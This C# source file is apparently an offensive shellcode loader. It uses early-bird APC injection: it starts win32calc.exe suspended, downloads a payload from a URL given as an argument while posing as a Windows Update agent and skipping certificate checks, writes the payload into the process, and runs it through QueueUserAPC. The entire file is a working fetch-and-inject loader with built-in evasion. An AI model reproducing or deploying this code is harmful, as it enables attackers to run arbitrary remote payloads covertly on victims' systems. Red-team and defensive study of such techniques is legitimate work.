using System;
using System.ComponentModel;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace QueueUserAPC
{
    internal class Program
    {
        internal static string ParseUrl(string[] args)
        {
            if (args.Length < 1)
                throw new ArgumentException("Shellcode URL is required.");

            var url = args[0];
            if (!Uri.TryCreate(url, UriKind.Absolute, out var uri) ||
                (uri.Scheme != Uri.UriSchemeHttp && uri.Scheme != Uri.UriSchemeHttps))
                throw new ArgumentException($"URL must use http or https scheme: {url}");

            return url;
        }

        static async Task Main(string[] args)
        {
            string shellcodeUrl;
            try
            {
                shellcodeUrl = ParseUrl(args);
            }
            catch (ArgumentException ex)
            {
                Console.Error.WriteLine($"Error: {ex.Message}");
                Console.Error.WriteLine("Usage: QueuserAPC <shellcode-url>");
                Console.Error.WriteLine("  e.g. QueuserAPC https://192.168.1.10/payload.bin");
                Environment.Exit(1);
                return;
            }

            var si = new Win32.STARTUPINFO();
            si.cb = Marshal.SizeOf(si);

            var pa = new Win32.SECURITY_ATTRIBUTES();
            pa.nLength = Marshal.SizeOf(pa);

            var ta = new Win32.SECURITY_ATTRIBUTES();
            ta.nLength = Marshal.SizeOf(ta);

            var pi = new Win32.PROCESS_INFORMATION();

            var success = Win32.CreateProcessW(
                "C:\\Windows\\System32\\win32calc.exe",
                null,
                ref ta,
                ref pa,
                false,
                0x00000004, // CREATE_SUSPENDED
                IntPtr.Zero,
                "C:\\Windows\\System32",
                ref si,
                out pi);

            if (!success)
                throw new Win32Exception(Marshal.GetLastWin32Error());

            byte[] shellcode;

            using (var handler = new HttpClientHandler())
            {
                // SSL validation intentionally disabled — lab/controlled environments only
                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                using (var client = new HttpClient(handler))
                {
                    client.DefaultRequestHeaders.UserAgent.ParseAdd("Windows-Update-Agent/10.0.10011.16384 Client-Protocol/1.40");
                    shellcode = await client.GetByteArrayAsync(shellcodeUrl);
                }
            }

            var baseAddress = Win32.VirtualAllocEx(
                pi.hProcess,
                IntPtr.Zero,
                (uint)shellcode.Length,
                Win32.AllocationType.Commit | Win32.AllocationType.Reserve,
                Win32.MemoryProtection.ReadWrite);

            Win32.WriteProcessMemory(
                pi.hProcess,
                baseAddress,
                shellcode,
                shellcode.Length,
                out _);

            Win32.VirtualProtectEx(
                pi.hProcess,
                baseAddress,
                (uint)shellcode.Length,
                Win32.MemoryProtection.ExecuteRead,
                out _);

            Win32.QueueUserAPC(baseAddress, pi.hThread, 0);

            Win32.ResumeThread(pi.hThread);
        }
    }
}
